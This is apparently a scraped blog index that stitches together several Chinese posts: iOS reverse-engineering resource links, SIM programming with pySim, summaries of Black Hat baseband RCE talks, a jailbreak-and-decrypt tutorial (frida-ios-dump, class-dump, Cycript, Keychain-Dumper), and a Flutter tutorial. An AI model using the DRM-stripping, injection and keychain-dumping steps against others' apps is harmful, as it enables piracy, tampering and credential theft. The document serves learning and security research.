https://legacy.gitbook.com/book/wizardforcel/ios-sec-wiki/details[http://security.ios-wiki.com](http://security.ios-wiki.com/) ","date":"2021-11-20","objectID":"/zh-cn/20/:13:0","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"其他 http://iphonedevwiki.net/ http://www.cydiasubstrate.com/https://www.theiphonewiki.com/ https://github.com/michalmalik/osx-re-101 https://github.com/kpwn/iOSREhttps://github.com/pandazheng/IosHackStudy http://www.droidsec.cn/category/ios%e5%ae%89%e5%85%a8%e6%94%bb%e9%98%b2/ https://github.com/nygard https://github.com/saurik PWN ","date":"2021-11-20","objectID":"/zh-cn/20/:14:0","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"安全类入门文章 https://www.fuzzysecurity.com/tutorials.html ","date":"2021-11-20","objectID":"/zh-cn/20/:15:0","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"入门pwn http://pwnable.kr/ ","date":"2021-11-20","objectID":"/zh-cn/20/:16:0","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"Iot安全 AzeriaLabs https://azeria-labs.com/writing-arm-shellcode/ ","date":"2021-11-20","objectID":"/zh-cn/20/:17:0","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"ARM汇编 iOS调试进阶 https://zhuanlan.zhihu.com/c_142064221 论坛 http://iosre.com ","date":"2021-11-20","objectID":"/zh-cn/20/:18:0","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":["编程"],"content":"此文为加密收费内容添加我微信支付后可看: SIM 编程② SIM 卡，用户身份模块（Subscriber Identity Module，SIM），是主要用于存储用户身份识别数据、短信数据和电话号码的智能卡。 USIM 卡：UMTS 用户身份模块（UMTS Subscriber Identity Module），是用于 UMTS 网络中的用户身份识别模块。USIM 卡还可以储存使用者资料、电话号码、认证资料、密钥、加密算法以及为短信提供储存空间。USIM 卡通常被认为是 SIM 卡的升级版，在 LTE（4G）网络中必须使用 USIM 卡，同时 USIM 卡向下兼容 2G、3G 网络。 ICCID： Integrated Circuit Card Identification，智能卡识别序列号码，用以标识 USIM 卡； IMSI： International Mobile Subscriber Identity，国际用户识别码，全球唯一的用户识别码； Ki：鉴权密钥，用于用户身份的鉴权。 OP：鉴权密钥，用于用户身份的鉴权。 OPc：鉴权密钥，使用 OP 和 Ki 分散计算得出。 在osmocom购买的测试卡，发货时还会提供 IMSI、ICCID、ACC、PIN1、PUK1、PIN2、PUK2、Ki、OPC、ADM1、KIC1、KID1、KIK1等参数 将SIM密钥写入MME数据库后，当基站启动、SIM卡入网鉴权时，核心网将对数据库中的密钥采用特定算法进行运算，如果运算结果与SIM卡侧运算结果相同，则正常入网使用，反之，则入网失败。 ","date":"2021-11-19","objectID":"/zh-cn/19-3/:0:0","tags":["编程"],"title":"SIM 编程②","uri":"/zh-cn/19-3/"},{"categories":["编程"],"content":"Linux pysim git clone https://github.com/osmocom/pysim``sudo apt-get install python3-pyscard python3-serial python3-cmd2 python3-pip python3-yaml``sudo pip3 install pytlv jsonpath-ng construct bidict gsm0338``cd pysim``sudo pip3 install -r requirements.txt``sudo apt install pcsc-tools pcscd #安装PCSC 智能卡软件 sudo systemctl start pcscd``sudo systemctl enable pcscd lsusb Bus 001 Device 012: ID 076b:6632 OmniKey AG sudo pcsc_scan``PC/SC device scanner``V 1.5.2 (c) 2001-2017, Ludovic Rousseau \u003cludovic.rousseau@free.fr\u003e``Using reader plug'n play mechanism``Scanning present readers...``0: HID Global OMNIKEY 6121 Smart Card Reader [OMNIKEY 6121 Smart Card Reader] 00 00` `Thu Jul 22 16:54:49 2021`` ``Reader 0: HID Global OMNIKEY 6121 Smart Card Reader [OMNIKEY 6121 Smart Card Reader] 00 00`` ``Card state: Card inserted,`` ``ATR: 3B 9F 96 80 1F C7 80 31 A0 73 BE 21 13 67 43 20 07 18 00 00 01 A5` `ATR: 3B 9F 96 80 1F C7 80 31 A0 73 BE 21 13 67 43 20 07 18 00 00 01 A5``+ TS = 3B --\u003e Direct Convention``+ T0 = 9F, Y(1): 1001, K: 15 (historical bytes)`` ``TA(1) = 96 --\u003e Fi=512, Di=32, 16 cycles/ETU`` ``250000 bits/s at 4 MHz, fMax for Fi = 5 MHz =\u003e 312500 bits/s`` ``TD(1) = 80 --\u003e Y(i+1) = 1000, Protocol T = 0``-----`` ``TD(2) = 1F --\u003e Y(i+1) = 0001, Protocol T = 15 - Global interface bytes following``-----`` ``TA(3) = C7 --\u003e Clock stop: no preference - Class accepted by the card: (3G) A 5V B 3V C 1.8V``+ Historical bytes: 80 31 A0 73 BE 21 13 67 43 20 07 18 00 00 01`` ``Category indicator byte: 80 (compact TLV data object)`` ``Tag: 3, len: 1 (card service data byte)`` ``Card service data byte: A0`` ``- Application selection: by full DF name`` ``- BER-TLV data objects available in EF.DIR`` ``- EF.DIR and EF.ATR access services: by GET RECORD(s) command`` ``- Card with MF`` ``Tag: 7, len: 3 (card capabilities)`` ``Selection methods: BE`` ``- DF selection by full DF name`` ``- DF selection by path`` ``- DF selection by file identifier`` ``- Implicit DF selection`` ``- Short EF identifier supported`` ``- Record number supported`` ``Data coding byte: 21`` ``- Behaviour of write functions: proprietary`` ``- Value 'FF' for the first byte of BER-TLV tag fields: invalid`` ``- Data unit in quartets: 2`` ``Command chaining, length fields and logical channels: 13`` ``- Logical channel number assignment: by the card`` ``- Maximum number of logical channels: 4`` ``Tag: 6, len: 7 (pre-issuing data)`` ``Data: 43 20 07 18 00 00 01``+ TCK = A5 (correct checksum)` `Possibly identified card (using /usr/share/pcsc/smartcard_list.txt):``3B 9F 96 80 1F C7 80 31 A0 73 BE 21 13 67 43 20 07 18 00 00 01 A5`` ``sysmoUSIM-SJS1 (Telecommunication)`` ``http://www.sysmocom.de/products/sysmousim-sjs1-sim-usim`` ``\\ 操作 读取SIM卡信息 sudo ./pySim-read.py --pcsc-device=0 Using PC/SC reader interface``Reading ...``Autodetected card type: sysmoUSIM-SJS1``ICCID: 8988211000000268030``IMSI: 901700000026803``GID1: ffffffffffffffffffff``GID2: ffffffffffffffffffff``SMSP: ffffffffffffffffffffffffffffffffffffffffffffffffe1ffffffffffffffffffffffff0581005155f5ffffffffffff000000``SPN: Not available``Show in HPLMN: False``Hide in OPLMN: False``PLMNsel: ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff``PLMNwAcT:`` ``ffffffffff # unused`` ``ffffffffff # unused`` ``ffffffffff # unused`` ``ffffffffff # unused`` ``ffffffffff # unused`` ``ffffffffff # unused`` ``ffffffffff # unused`` ``ffffffffff # unused`` ``ffffffffff # unused`` ``ffffffffff # unused`` ``ffffffffff # unused`` ``ffffffffff # unused` `OPLMNwAcT:`` ``ffffffffff # unused`` ``ffffffffff # unused`` ``ffffffffff # unused`` ``ffffffffff # unused`` ``ffffffffff # unused`` ``ffffffffff # unused`` ``ffffffffff # unused`` ``ffffffffff # unused`` ``ffffffffff # unused`` ``ffffffffff # unused`` ``ffffffffff # unused`` ``ffffffffff # unused` `HPLMNAcT:`` ``ffffffffff # unused`` ``ffffffffff # unused`` ``ffffffffff # unused`` ``ffffffffff # unused`` ``ffffffffff # unused`` ``ffff","date":"2021-11-19","objectID":"/zh-cn/19-3/:0:1","tags":["编程"],"title":"SIM 编程②","uri":"/zh-cn/19-3/"},{"categories":["编程"],"content":"Windows SIM Explorer 、 USIM_Explorer、SIM Personalize tools ","date":"2021-11-19","objectID":"/zh-cn/19-3/:0:2","tags":["编程"],"title":"SIM 编程②","uri":"/zh-cn/19-3/"},{"categories":["编程"],"content":"参考： https://irp-cdn.multiscreensite.com/db714ead/files/uploaded/SIMExplorer.pdf https://www.sysmocom.de/manuals/sysmousim-manual.pdf https://cyberloginit.com/2018/05/14/eastcompeace-usim-exploit-and-notes-on-smart-card-pentest-for-linux.html https://github.com/cn0xroot/BTS_Research ","date":"2021-11-19","objectID":"/zh-cn/19-3/:0:3","tags":["编程"],"title":"SIM 编程②","uri":"/zh-cn/19-3/"},{"categories":["编程"],"content":"此文为加密收费内容添加我微信支付后可看: SIM卡编程 How Do SIM Cards Work? How Do SIM Cards Work? - YouTube How do SIM Cards work? – SIMtrace How do SIM Cards work? - SIMtrace - YouTube Osmocom Dev Call : Program your sim card with Pysim-shell By Harald Welte osmocom近期更新了Pysim，在原来的基础上，增加了shell模式，读写SIM卡操作可以像mysql的增删改查一样操作 https://meeting4.franken.de/playback/presentation/2.0/playback.html?meetingId=10e07e078472a1876b5c23655123bfd50bc4b187-1617991215535 sysmoUSIM / sysmoISIM User Manual By Harald Welte 蓝色跟橙色的SIM卡可用于2G 3G 4G NB基站（不支持5G） 黑色版采用了新标准，增加了对5G的支持 https://www.sysmocom.de/manuals/sysmousim-manual.pdf SIM 卡工具 https://github.com/cn0xroot/BTS_Research/blob/main/sim_card.md A curated list of telco resources and projects https://github.com/ravens/awesome-telco ","date":"2021-11-19","objectID":"/zh-cn/19-2/:0:0","tags":["编程"],"title":"SIM卡编程","uri":"/zh-cn/19-2/"},{"categories":["基站","Pwn","利用"],"content":"此文为加密收费内容添加我微信支付后可看: 软基站高级利用：Blackhat USA 2021上Pwn基带的议题 ","date":"2021-11-19","objectID":"/zh-cn/19-1/:0:0","tags":["基站","Pwn","利用"],"title":"软基站高级利用：Blackhat USA 2021上Pwn基带的议题","uri":"/zh-cn/19-1/"},{"categories":["基站","Pwn","利用"],"content":"一 Pwn三星Shannon 5G基带 腾讯科恩实验室 基带利用：远程5G智能手机代码执行 | Over The Air Baseband Exploit: Gaining Remote Code Execution on 5G Smartphones 解读：https://keenlab.tencent.com/zh/2021/08/06/BlackHatUSA2021-over-the-air-baseband/ 白皮书：https://keenlab.tencent.com/zh/whitepapers/us-21-Over-The-Air-Baseband-Exploit-Gaining-Remote-Code-Execution-on-5G-Smartphones-wp.pdf RCE漏洞在Shannon基带的IMS模块，基带在解析SIP协议消息的XML内容时，它会调用函数IMSPL_XmlGetNextTagName，该函数通过跳过特殊字符来查找标签的结尾，而没有安全检查，通过溢出缓冲区，控制存储在栈上的返回地址，并获得代码执行。 通过Kamailio自建IMS核心网、SRSRAN+USRP+Osmocom sim card实现蜂窝网络模拟实验环境，UE终端注册并订阅到SIP服务器，服务器将发送NOTIFY消息以提供网络中的基本信息，在NOTIFY消息中夹带XML格式的漏洞利用payload。 ","date":"2021-11-19","objectID":"/zh-cn/19-1/:0:1","tags":["基站","Pwn","利用"],"title":"软基站高级利用：Blackhat USA 2021上Pwn基带的议题","uri":"/zh-cn/19-1/"},{"categories":["基站","Pwn","利用"],"content":"二 Pwn华为麒麟芯片基带 西班牙TASZK安全实验室 How To Tame Your Unicorn Exploring And Exploiting Zero-Click Remote Interfaces of Huawei Smartphones | 零点击交互远程破解华为智能手机 白皮书：https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Komaromy-How-To-Tame-Your-Unicorn-wp.pdf PPT：https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Komaromy-How-To-Tame-Your-Unicorn.pdf 华为公开了搭载麒麟980、970设备的内核源码，西班牙TASZK安全实验室通过源代码审计在GSM信令消息编码解码的语法CSN.1上发现了内存越界漏洞 通过Osmocom2G基站以及OsmoMSC发送Payload利用代码去触发相关漏洞： ","date":"2021-11-19","objectID":"/zh-cn/19-1/:0:2","tags":["基站","Pwn","利用"],"title":"软基站高级利用：Blackhat USA 2021上Pwn基带的议题","uri":"/zh-cn/19-1/"},{"categories":["基站","Pwn","利用"],"content":"碎碎念 通过空中接口无接触Pwn基带，非常考验综合实力，相关方面涉及通信（2G 3G 4G 5G等蜂窝网络技术以及3GPP协议标准） 二进制逆向（固件提取、解密、漏洞利用）等。而且对相关方面要求特别高，个人感觉没有长期的技术积累、团队协作，靠一个人单打独斗很难实现 ","date":"2021-11-19","objectID":"/zh-cn/19-1/:0:3","tags":["基站","Pwn","利用"],"title":"软基站高级利用：Blackhat USA 2021上Pwn基带的议题","uri":"/zh-cn/19-1/"},{"categories":[],"content":"此文为加密收费内容添加我微信支付后可看: iOS 逆向工程初體驗 從越獄、提取iPA檔敲殼到UI分析注入及反編譯的探索過程 關於安全 之前唯一做過跟安全有關的就只有 « 使用中間人攻擊嗅探傳輸資料 » ；另外也接續這篇，假設我們在資料傳輸前編碼加密、接受時 APP 內解密，用以防止中間人嗅探；那還有可能被偷走資料嗎？ 答案是肯定的！，就算沒真的試驗過；世界上沒有破不了的系統，只有時間成本的問題，當破解耗費的時間精力大於破解成果，那就可以稱為是安全的！ ","date":"2021-11-19","objectID":"/zh-cn/19/:0:0","tags":[],"title":"iOS 逆向工程初體驗","uri":"/zh-cn/19/"},{"categories":[],"content":"How? 都做到這樣了，那還能怎麼破？就是本篇想記錄的議題 — 「逆向工程 」，敲開你的 APP 研究你是怎麼做加解密的；其實一直以來對這個領域都是懵懵懂懂，只在 iPlayground 2019 上聽過兩堂大大的分享，大概知道原理還有怎麼實現，最近剛好有機會玩了一下跟大家分享！ 逆了向，能幹嘛？ 查看 APP UI 排版方式、結構 獲取 APP 資源目錄 .assets/.plist/icon… 竄改 APP 功能重新打包 (EX: 去廣告) 反編譯推測原始程式碼內容取得商業邏輯資訊 dump 出 .h 標頭檔 / keycahin 內容 實現環境 **macOS 版本：**10.15.3 Catalina iOS **版本：**iPhone 6 (iOS 12.4.4 / 已越獄) *必要 Cydia: Open SSH ","date":"2021-11-19","objectID":"/zh-cn/19/:1:0","tags":[],"title":"iOS 逆向工程初體驗","uri":"/zh-cn/19/"},{"categories":[],"content":"越獄的部分 任何版本的 iOS、iPhone 都可以，只要是能越獄的設備，建議使用舊的手機或是開發機，以避免不必要的風險；可根據自己的手機、iOS 版本參考瘋先生越獄教學，必要時需要將 iOS 降版（認證狀態查詢）再越獄。 我是拿之前的舊手機 iPhone 6 來測試，原本已經升到 iOS 12.4.5 了，但發現 12.4.5 一直越獄不成功，所幸先降回 12.4.4 然後使用 checkra1n 越獄就成功了！ 步驟不多，也不難；只是需要時間等待！ **附上一個自己犯蠢的經驗：下載完舊版 IPSW 檔案後，手機接上 Mac ，直接使用 Finder 檔案瀏覽器(macOS 10.5 後就沒有 iTunes 了)，在左方 Locations 選擇手機，出現手機資訊畫面後，「Option」按著然後再點「Restore iPhone」**就能跳出 IPSW 檔案選擇視窗，選擇剛下載下來的舊版 IPSW 檔案就能完成刷機降版。 我本來傻傻的直接按 Restore iPhone…只會浪費時間重刷一次最新版而已…. 使用 lookin 工具查看別人的 APP UI 排版 我們先來點有趣的前菜，使用工具搭配越獄手機查看別人APP 是怎麼排版。 查看工具： 一是 老牌 Reveal (功能更完整，需付費約 $60 美金/可試用)，二是騰訊 QMUI Team 製作的 lookin 免費開源工具；這邊使用 lookin 作為示範，Reveal 大同小異。 *若沒有越獄手機也沒關係，此工具主要是讓你用在開發中的專案上，查看 Debug 排版（取代 Xcode 陽春的 inspector）*平常開發也能用到*！ **唯有要看別人的 APP 需要使用越獄手機。* ","date":"2021-11-19","objectID":"/zh-cn/19/:2:0","tags":[],"title":"iOS 逆向工程初體驗","uri":"/zh-cn/19/"},{"categories":[],"content":"如果要看自己的專案… 可以選擇使用 CocoaPods 安裝、斷點插入（僅支援模擬器）、手動導入Framework 到專案、手動設置，四種方法。 將專案 Build + Run 起來之後，就能在 Lookin 工具上選擇 APP 畫面 -\u003e 查看排版結構。 ","date":"2021-11-19","objectID":"/zh-cn/19/:3:0","tags":[],"title":"iOS 逆向工程初體驗","uri":"/zh-cn/19/"},{"categories":[],"content":"如果要看別人的APP… Step 1. 在越獄手機上打開「Cydia」-\u003e 搜尋「LookinLoader」-\u003e「安裝」-\u003e 回到手機「設定」-\u003e「Lookin」-\u003e「Enabled Applications」-\u003e 啟用想要查看的 APP 。 Step 2. 使用傳輸線將手機連接至 Mac 電腦 -\u003e 打開想要查看的APP -\u003e 回到電腦，在 Lookin 工具上選擇 APP 畫面 -\u003e 即可查看排版結構。 ","date":"2021-11-19","objectID":"/zh-cn/19/:4:0","tags":[],"title":"iOS 逆向工程初體驗","uri":"/zh-cn/19/"},{"categories":[],"content":"Lookin 查看排版結構 Facebook 登入畫面排版結構 可在左側欄檢視 View Hierarchy、右側欄對選中的物件進行動態修改。 原本的「建立新帳號」被我改成「哈哈哈」 對物件的修改也會實時的顯示在手機 APP 上，如上圖。 就如同網頁的「F12」開發者工具，所有的修改僅對 View 有效，不會影響實際的資料；主要是拿來 Debug ，當然也可以用來改值、截圖，然後騙朋友 ＸＤ ","date":"2021-11-19","objectID":"/zh-cn/19/:5:0","tags":[],"title":"iOS 逆向工程初體驗","uri":"/zh-cn/19/"},{"categories":[],"content":"使用 Reveal 工具查看 APP UI 排版結構 雖然 Reveal 需要付費才能使用，但個人還是比較喜歡 Reveal；在結構顯示上資訊更詳細、右方資訊欄位幾乎等同於 XCode 開發環境，想做什麼即時調整都可以，另外也會提示 Constraint Error 對於 UI 排版修正非常有幫助！ 這兩個工具在日常開發自己的 APP 上都非常有幫助！ *了解完流程環境及有趣的部分之後，就讓我們進入正題吧！ **以下開始都需要越獄手機配合 提取 APP .ipa 檔案 \u0026 砸殼 所有從 App Store 安裝的 APP，其中的 .ipa 檔案都有 FairPlay DRM 保護 ，俗稱加殼保護/相反的去掉保護就叫「砸殼」，所以單純從 App Stroe 提取 .ipa 是沒有意義的，也用不了。 *另一個工具 APP Configurator 2 只能提取有保護的檔案，沒意義就不再贅述，有興趣使用此工具的朋友可以點此查看教學。 ","date":"2021-11-19","objectID":"/zh-cn/19/:6:0","tags":[],"title":"iOS 逆向工程初體驗","uri":"/zh-cn/19/"},{"categories":[],"content":"使用工具+越獄手機提取砸殼之後的原始 .ipa 檔案： 關於工具部分起初我使用的是 Clutch ，但怎麼嘗試都出現 FAILED 查了下專案 issue，發現有很多人有同樣狀況，貌似此工具已經不能在 iOS ≥ 12 使用了、另外還有一個老牌工具 dumpdecrypted ，但我沒有研究。 這邊使用 frida-ios-dump 這個 Python 工具進行動態砸殼，使用起來非常方便！ 首先我們先準備 Mac 上的環境： Mac 本身自帶 Python 2.7 版本，此工具支援 Python 2.X/3.X，所以不用在特別安裝 Python；但我是使用 Python 3.X 進行操作的，如果有遇到 Python 2.X 的問題，不妨嘗試安裝使用 Python 3 吧！ 安裝 pip（ Python 的套件源管理器） 使用 pip 安裝 frida： sudo pip install frida -upgrade -ignore-installed six (python 2.X) sudo pip3 install frida -upgrade -ignore-installed six (python 3.X) 在 Terminal 輸入 frida-ps 如果沒錯誤訊息代表安裝成功！ Clone AloneMonkey/frida-ios-dump 這個專案 進入專案，用文字編輯器打開 dump.py 檔案 確認 SSH 連線設定部分是否正確 (預設不用特別動) User = ‘root’ Password = ‘alpine’ Host = ‘localhost’ Port = 2222 越獄手機上的環境： 安裝 Open SSH ：Cydia → 搜尋 → Open SSH →安裝 安裝 Frida 源：Cydia → 來源 → 右上角「編輯」 → 左上角「加入」 → https://build.frida.re 安裝 Frida：Cydia → 搜尋 → Frida → 依照手機處理器版本安裝對應的工具（EX: 我是 iPhone 6 A11，所以是裝 Frida for pre-A12 devices 這個工具） 環境都弄好之後，開工： 1.將手機使用 USB 連接到電腦 2.在 Mac 上打開一個 Terminal 輸入 iproxy 2222 22 ，啟動 Server。 3.確保手機/電腦處於相同網路環境中(EX: 連同個WiFi) 4.再打開一個 Terminal 輸入 ssh root@127.0.0.1，輸入 SSH 密碼(預設是 alpine) 5.再打開一個 Terminal 進行敲殼命令操作，cd 到 clone 下來的 /frida-ios-dump 目錄下。 輸入 dump.py -l 列出手機中已安裝/正在執行的 APP。 \\6. 找到要敲殼導出的 APP 名稱 / Bundle ID，輸入： dump.py **APP名稱或BundleID** -o **輸出結果的路徑/輸出檔名.ipa** 這邊務必指定輸出結果的路徑/檔名，因為預設輸出路徑會在 /opt/dump/frida-ios-dump/ 這邊不想把它搬到 /opt/dump 中，所以要指定輸出路徑避免權限錯誤。 \\7. 輸出成功後就能取得已敲殼的 .ipa 檔案！ 手機必須在解鎖情況下才能使用工具 若出現連線錯誤、reset by peer…等原因，可嘗試拔掉重插 USB 連接、重開 iproxy。 7.將 .ipa 檔直接重新命名成 .zip 檔，然後直接右鍵解壓縮檔 會出現 /Payload/APP名稱.app 有了原始 APP 檔後我們可以… ","date":"2021-11-19","objectID":"/zh-cn/19/:7:0","tags":[],"title":"iOS 逆向工程初體驗","uri":"/zh-cn/19/"},{"categories":[],"content":"1. 提取 APP 的資源目錄 在 APP名稱.app 右鍵 → 「Show Package Contents」就能看到 APP 的資源目錄 ","date":"2021-11-19","objectID":"/zh-cn/19/:8:0","tags":[],"title":"iOS 逆向工程初體驗","uri":"/zh-cn/19/"},{"categories":[],"content":"2. class-dump 出 APP .h頭文件訊息 使用 class-dump 工具導出全 APP (包含 Framework) .h 頭文件訊息 (僅限 Objective-C，若專案為 Swift 則無效) nygard/class-dump 大大的工具我嘗試失敗，一直 failed；最後還是一樣使用 AloneMonkey/MonkeyDev 大大的工具集中改寫過的 class-dump 工具才成功。 直接從這裡 Download MonkeyDev/bin/class-dump 工具 打開 Terminal 直接使用： ./class-dump -H **APP路徑/APP名稱.app** -o **匯出的目標路徑** dump 成功之後就能獲取到整個 APP 的 .h 資訊。 ","date":"2021-11-19","objectID":"/zh-cn/19/:9:0","tags":[],"title":"iOS 逆向工程初體驗","uri":"/zh-cn/19/"},{"categories":[],"content":"4. 最後也是最困難的 — 進行反編譯 可以使用 IDA 和 Hopper 反編譯工具進行分析使用，兩款都是收費工具， Hopper 可免費試用(每次 30 分鐘) 我們將取得的 APP名稱.app 檔案直接拉到 Hopper 即可開始進行分析。 不過我也就止步於此了，因為從這開始就要研究機器碼、搭配 class-dump 結果推測方法…等等；需要非常深入的功力才行！ 突破反編譯後，可以自行竄改運作重新打包成新的 APP。 圖片取自航海王 逆向工程的其他工具 1.使用 MITM Proxy 免費工具嗅探 API 網路請求資訊 »APP有用HTTPS傳輸，但資料還是被偷了。 2.Cycript (搭配越獄手機) 動態分析/注入工具： 在越獄手機上打開「Cydia」-\u003e 搜尋「Cycript」-\u003e「安裝」 在電腦打開一個 Terminal 使用 Open SSH 連線至手機，ssh root@手機IP (預設是 alpine) 打開目標 APP (APP 保持在前景) 在 Terminal 輸入 ps -e | grep **APP Bundle ID** 查找正在運行的 APP Process ID 使用 cycript -p **Process ID** 注入工具到正在運行的 APP 可使用 Objective-c/Javascript 進行調試控制。 For Example: cy# alert = [[UIAlertView alloc] initWithTitle:@\"HIHI\" message:@\"ZhgChg.li\" delegate:nil cancelButtonTitle:@\"Cancel\" otherButtonTitles:nl] cy# [alert show] 注入一個 UIAlertViewController… chose(): 獲取目標 UIApp.keyWindow.recursiveDescription().toString(): 顯示 view hierarchy 結構資訊 new Instance(記憶體位置): 獲取物件 exit(0): 結束 詳細操作可參考此篇文章。 3. Lookin / Reveal 查看 UI 排版工具 前面介紹過，再推一次；在自己的專案日常開發上也非常好用，建議購買使用 Reveal。 4. MonkeyDev 集成工具，可透過動態注入竄改 APP 並重新打包成新的 APP 5.ptoomey3/Keychain-Dumper，導出 KeyChain 內容 詳細操作請參考此篇文章，不過我沒試成功，看專案 issue 貌似也是在 iOS ≥ 12 之後就失效了。 總結 這個領域是個超級大坑，需要非常多的技術知識基礎才有可能精通；本篇文章只是粗淺了「體驗」了一下逆向工程是什麼感覺，如有不足敬請見諒！僅供學術研究，勿做壞壞的事；個人覺得整個流程工具玩下來蠻有趣的，也對 APP 安全更有點概念！ ","date":"2021-11-19","objectID":"/zh-cn/19/:10:0","tags":[],"title":"iOS 逆向工程初體驗","uri":"/zh-cn/19/"},{"categories":["MacOS","Flutter","开发","环境","配置"],"content":"此文为加密收费内容添加我微信支付后可看: 编写您的第一个 Flutter App 这是创建您的第一个Flutter应用程序的指南。如果您熟悉面向对象和基本编程概念（如变量、循环和条件控制），则可以完成本教程，您无需要了解Dart或拥有移动开发的经验。 第1步: 创建 Flutter app 第2步: 使用外部包(package) 第3步: 添加一个 有状态的部件（Stateful widget） 第4步: 创建一个无限滚动ListView 第5步: 添加交互 第6步: 导航到新页面 第7步：使用主题更改UI 做的好! 你将会构建什么？ 您将完成一个简单的移动应用程序，功能是：为一个创业公司生成建议的名称。用户可以选择和取消选择的名称、保存（收藏）喜欢的名称。该代码一次生成十个名称，当用户滚动时，会生成一新批名称。用户可以点击导航栏右边的列表图标，以打开到仅列出收藏名称的新页面。 这个 GIF 图展示了最终实现的效果 你会学到什么: Flutter应用程序的基本结构. 查找和使用packages来扩展功能. 使用热重载加快开发周期. 如何实现有状态的widget. 如何创建一个无限的、延迟加载的列表. 如何创建并导航到第二个页面. 如何使用主题更改应用程序的外观. 你会用到什么？ 您需要安装以下内容: Flutter SDK Flutter SDK包括Flutter的引擎、框架、widgets、工具和Dart SDK。此示例需要v0.1.4或更高版本 Android Studio IDE 此示例使用的是Android Studio IDE，但您可以使用其他IDE，或者从命令行运行 Plugin for your IDE 你必须为您的IDE单独安装Flutter 和 Dart插件，我们也提供了 VS Code 和 IntelliJ 的插件. 有关如何设置环境的信息，请参阅Flutter 安装和设置 第1步: 创建 Flutter app 创建一个简单的、基于模板的Flutter应用程序，按照创建您的第一个Flutter应用中的指南的步骤， 然后将项目命名为startup_namer（而不是myapp)，接下来你将会修改这个应用来完成最终的APP。 在这个示例中，你将主要编辑Dart代码所在的 lib/main.dart 文件, 提示: 将代码粘贴到应用中时，缩进可能会变形。您可以使用Flutter工具自动修复此问题: Android Studio / IntelliJ IDEA: 右键单击Dart代码，然后选择 Reformat Code with dartfmt. VS Code: 右键单击并选择 Format Document. Terminal: 运行 flutter format \u003cfilename\u003e. 替换 lib/main.dart. 删除lib / main.dart中的所有代码，然后替换为下面的代码，它将在屏幕的中心显示“Hello World”. import 'package:flutter/material.dart'; void main() =\u003e runApp(new MyApp()); class MyApp extends StatelessWidget { @override Widget build(BuildContext context) { return new MaterialApp( title: 'Welcome to Flutter', home: new Scaffold( appBar: new AppBar( title: new Text('Welcome to Flutter'), ), body: new Center( child: new Text('Hello World'), ), ), ); } } 运行应用程序，你应该看到如下界面. 分析 本示例创建一个Material APP。Material是一种标准的移动端和web端的视觉设计语言。 Flutter提供了一套丰富的Material widgets。 main函数使用了(=\u003e)符号, 这是Dart中单行函数或方法的简写。 该应用程序继承了 StatelessWidget，这将会使应用本身也成为一个widget。 在Flutter中，大多数东西都是widget，包括对齐(alignment)、填充(padding)和布局(layout) Scaffold 是 Material library 中提供的一个widget, 它提供了默认的导航栏、标题和包含主屏幕widget树的body属性。widget树可以很复杂。 widget的主要工作是提供一个build()方法来描述如何根据其他较低级别的widget来显示自己。 本示例中的body的widget树中包含了一个Center widget, Center widget又包含一个 Text 子widget。 Center widget可以将其子widget树对其到屏幕中心。 第2步: 使用外部包(package) 在这一步中，您将开始使用一个名为english_words的开源软件包 ，其中包含数千个最常用的英文单词以及一些实用功能. 您可以 在pub.dartlang.org上找到english_words软件包以及其他许多开源软件包 pubspec文件管理Flutter应用程序的assets(资源，如图片、package等)。 在pubspec.yaml中，将english_words（3.1.0或更高版本）添加到依赖项列表，如下面高亮显示的行： dependencies: flutter: sdk: flutter cupertino_icons: ^0.1.0 english_words: ^3.1.0 在Android Studio的编辑器视图中查看pubspec时，单击右上角的 Packages get，这会将依赖包安装到您的项目。您可以在控制台中看到以下内容： flutter packages get Running \"flutter packages get\" in startup_namer... Process finished with exit code 0 在 lib/main.dart 中, 引入 english_words, 如高亮显示的行所示: import 'package:flutter/material.dart'; import 'package:english_words/english_words.dart'; 在您输入时，Android Studio会为您提供有关库导入的建议。然后它将呈现灰色的导入字符串，让您知道导入的库尚未使用（到目前为止） 使用 English words 包生成文本来替换字符串“Hello World”. Tip: “驼峰命名法” (称为 “upper camel case” 或 “Pascal case” ), 表示字符串中的每个单词（包括第一个单词）都以大写字母开头。所以，“uppercamelcase” 变成 “UpperCamelCase” 进行以下更改, 如高亮部分所示: import 'package:flutter/material.dart'; import 'package:english_words/english_words.dart'; void main() =\u003e runApp(new MyApp()); class MyApp extends StatelessWidget { @override Widget build(BuildContext context) { final wordPair = new WordPair.random(); return new MaterialApp( title: 'Welcome to Flutter', home: new Scaffold( appBar: new AppBar( title: new Text('Welcome to Flutter'), ), body: new Center( //child: new Text('Hello World'), child: new Text(wordPair.asPascalCase), ), ), ); } } 如果应用程序正在运行，请使用热重载按钮 () 更新正在运行的应用程序。每次单击热重载或保存项目时，都会在正在运行的应用程序中随机选择不同的单词对。 这是因为单词对是在 build 方法内部生成的。每次MaterialApp需要渲染时或者在Flutter Inspector中切换平台时 build 都会运行. 遇到问题? 如果您的应用程序运行不正常，请查找是否有拼写错误。如果需要，使用下面链接中的代码来对比更正。 pubspec.yaml (The pubspec.yaml file won’t change again.) lib/main.dart 第3步: 添加一个 有状态的部件（Stateful widget） Stateless widgets 是不可变的, 这意味着它们的属性不能改变 - 所有的值都是最终的. Stateful widgets 持有的状态可能在widget生命周期中发生变化. 实现一个 stateful widget 至少需要两个类: 一个 StatefulWidget类。 一个 State类。 StatefulWidget类本身是不变的，但是 ","date":"2021-11-18","objectID":"/zh-cn/18-3/:0:0","tags":["MacOS","Flutter","开发","环境","配置"],"title":"编写您的第一个 Flutter App","uri":"/zh-cn/18-3/"},{"categories":["MacOS","Flutter","开发","环境","配置"],"content":"此文为加密收费内容添加我微信支付后可看: 起步: 体验 本页介绍如何 “试驾” Flutter: 从我们的模板创建一个新的Flutter应用程序，运行它，并学习如何使用Hot Reload进行更新重载 Flutter是一个灵活的工具包，所以请首先选择您的开发工具来编写、构建和运行您的Flutter应用程序。 Android 